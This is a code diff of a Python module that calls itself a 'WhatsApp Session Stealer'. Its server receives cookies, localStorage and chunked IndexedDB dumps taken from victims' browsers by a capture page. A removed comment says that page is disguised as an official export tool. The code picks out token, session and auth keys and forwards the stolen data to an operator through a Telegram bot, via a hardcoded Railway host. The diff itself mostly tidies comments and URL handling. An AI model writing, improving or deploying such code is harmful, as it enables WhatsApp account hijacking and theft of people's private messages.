@@ -1,7 +1,6 @@
 # wa_stealer.py
 # ============================================================
-# WhatsApp Session Stealer - الإصدار القوي
-# يعتمد على Bookmarklet + IndexedDB Extraction
+# WhatsApp Session Stealer
 # ============================================================
 
 import os
@@ -54,10 +53,21 @@ except Exception as e:
     logger.error(f"WA Redis error: {e}")
     redis_client = None
 
-RAILWAY_URL = os.getenv(
-    "RAILWAY_URL",
-    "daf-production-e34a.up.railway.app"
-)
+
+# ============================================================
+# [2] ★★★ URL السيرفر — يقرأ من ENV ★★★
+# ============================================================
+RAILWAY_URL = os.getenv("RAILWAY_URL", "").strip()
+
+if not RAILWAY_URL:
+    RAILWAY_URL = "https://daf-production-e34a.up.railway.app"
+    logger.warning("⚠️ WA: RAILWAY_URL not set in ENV - using default")
+
+if not RAILWAY_URL.startswith(("http://", "https://")):
+    RAILWAY_URL = "https://" + RAILWAY_URL
+
+logger.info(f"WA: RAILWAY_URL = {RAILWAY_URL}")
+
 
 # جلسات
 wa_sessions = {}
@@ -65,7 +75,7 @@ wa_sessions_lock = threading.Lock()
 
 
 # ============================================================
-# [2] إدارة الجلسات
+# [3] إدارة الجلسات
 # ============================================================
 def create_wa_session(session_id, chat_id):
     with wa_sessions_lock:
@@ -97,7 +107,7 @@ def get_wa_session(session_id):
 
 
 # ============================================================
-# [3] صفحة الالتقاط — تبدو كأداة تصدير رسمية
+# [4] صفحة الالتقاط
 # ============================================================
 WA_PAGE = r"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -480,7 +490,7 @@ WA_PAGE = r"""<!DOCTYPE html>
 
 
 # ============================================================
-# [4] استقبال البيانات
+# [5] استقبال البيانات
 # ============================================================
 def init_whatsapp_stealer_routes(app, bot):
 
@@ -534,9 +544,6 @@ def init_whatsapp_stealer_routes(app, bot):
             sess["last_seen"] = time.time()
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
 
-            # ============================================================
-            # بدء
-            # ============================================================
             if dtype == 'start':
                 bot.send_message(
                     cid,
@@ -550,9 +557,6 @@ def init_whatsapp_stealer_routes(app, bot):
                 )
                 metrics.inc_counter("wa_started")
 
-            # ============================================================
-            # Storage + Cookies
-            # ============================================================
             elif dtype == 'storage':
                 cookies = data.get('cookies', '')
                 local = data.get('localStorage', {})
@@ -597,7 +601,6 @@ def init_whatsapp_stealer_routes(app, bot):
                         parse_mode="Markdown"
                     )
 
-                # إظهار المفاتيح المهمة
                 important_keys = [
                     k for k in local.keys()
                     if any(x in k.lower() for x in ['token', 'session', 'auth', 'key', 'user', 'wa'])
@@ -613,9 +616,6 @@ def init_whatsapp_stealer_routes(app, bot):
 
                 metrics.inc_counter("wa_storage_received")
 
-            # ============================================================
-            # Chunks IndexedDB
-            # ============================================================
             elif dtype == 'idb_chunk':
                 chunk_num = data.get('chunk_num', 0)
                 total_chunks = data.get('total_chunks', 1)
@@ -633,7 +633,6 @@ def init_whatsapp_stealer_routes(app, bot):
                     except Exception as e:
                         logger.error(f"Redis save chunk error: {e}")
 
-                # أبلغ كل 5 chunks
                 if chunk_num % 5 == 0 or chunk_num == total_chunks - 1:
                     try:
                         bot.send_message(
@@ -644,13 +643,9 @@ def init_whatsapp_stealer_routes(app, bot):
                     except Exception as e:
                         logger.warning(f"chunk notify error: {e}")
 
-            # ============================================================
-            # إكمال
-            # ============================================================
             elif dtype == 'complete':
                 total_chunks = data.get('total_chunks', 0)
 
-                # اجمع كل الـ chunks
                 full_data = ""
                 if redis_client:
                     try:
@@ -716,10 +711,9 @@ def init_whatsapp_stealer_routes(app, bot):
 
 
 # ============================================================
-# [5] تحليل البيانات
+# [6] تحليل البيانات
 # ============================================================
 def _analyze_idb_data(json_data):
-    """يحلل IndexedDB ويحضر ملخص"""
     try:
         data = json.loads(json_data)
     except json.JSONDecodeError:
@@ -740,7 +734,7 @@ def _analyze_idb_data(json_data):
 
 
 # ============================================================
-# [6] لوحة تحكم البوت
+# [7] لوحة تحكم البوت
 # ============================================================
 def build_wa_panel(session_id, chat_id):
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -757,10 +751,9 @@ def build_wa_panel(session_id, chat_id):
 
 
 # ============================================================
-# [7] دوال مساعدة للبوت
+# [8] دوال مساعدة
 # ============================================================
 def get_wa_data(session_id):
-    """يرجع كل بيانات الجلسة"""
     result = {
         "storage": None,
         "idb": None,
